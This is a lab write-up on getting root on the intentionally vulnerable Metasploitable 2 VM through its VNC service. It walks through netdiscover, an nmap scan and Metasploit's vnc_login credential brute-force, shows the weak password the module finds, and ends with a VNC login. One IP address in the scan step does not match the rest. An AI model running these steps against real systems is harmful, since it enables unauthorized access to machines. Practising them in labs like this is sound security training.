# Metasploitable 2 VNC exploit write-up


Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - VNC.



 > The target of this lab is use vulnerablitity in **VNC** service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on vulnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
5900/tcp open  vnc         VNC (protocol 3.3)
.
.
.
```

We'll exploit this vulnerability using metasploit.

`sudo msfdb init && msfconsole`

Search for vnc; `msf6 > search vnc login`

```
Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/vnc/vnc_login  .                normal  No     VNC Authentication Scanner
   ```

Using this modules, look for it's options; `msf6 auxiliary(scanner/vnc/vnc_login) > show options`

```
Module options (auxiliary/scanner/vnc/vnc_login):

   Name              Current Setting                               Required  Description
   ----              ---------------                               --------  -----------
   ANONYMOUS_LOGIN   false                                         yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                                         no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                             yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                         no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                         no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                         no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                          no        Skip existing credentials stored in the current database (Accepted: none, user,
                                                                             user&realm)
   PASSWORD                                                        no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlis  no        File containing passwords, one per line
                     ts/vnc_passwords.txt
   Proxies                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics
                                                                             /using-metasploit.html
   RPORT             5900                                          yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                         yes       Stop guessing when a credential works for a host
   THREADS           1                                             yes       The number of concurrent threads (max one per host)
   USERNAME          <BLANK>                                       no        A specific username to authenticate as
   USERPASS_FILE                                                   no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                         no        Try the username as the password for all users
   USER_FILE                                                       no        File containing usernames, one per line
   VERBOSE           true                                          yes       Whether to print output for all attempts
```

We only need to set Remote Host IP address to set.

`msf6 auxiliary(scanner/vnc/vnc_login) > set RHOSTS 192.168.43.95`

## Exploitation:

Just hit run; 
`msf6 auxiliary(scanner/vnc/vnc_login) > run`

```
[*] 192.168.43.95:5900    - 192.168.43.95:5900 - Starting VNC login sweep
[+] 192.168.43.95:5900    - 192.168.43.95:5900 - Login Successful: :password
[*] 192.168.43.95:5900    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> We got password: password

Now use vncviewer with remote IP address; `vncviewer 192.168.43.95`

A new window will apear which is the vnc window logged in as root, meaning that we have got **root** access!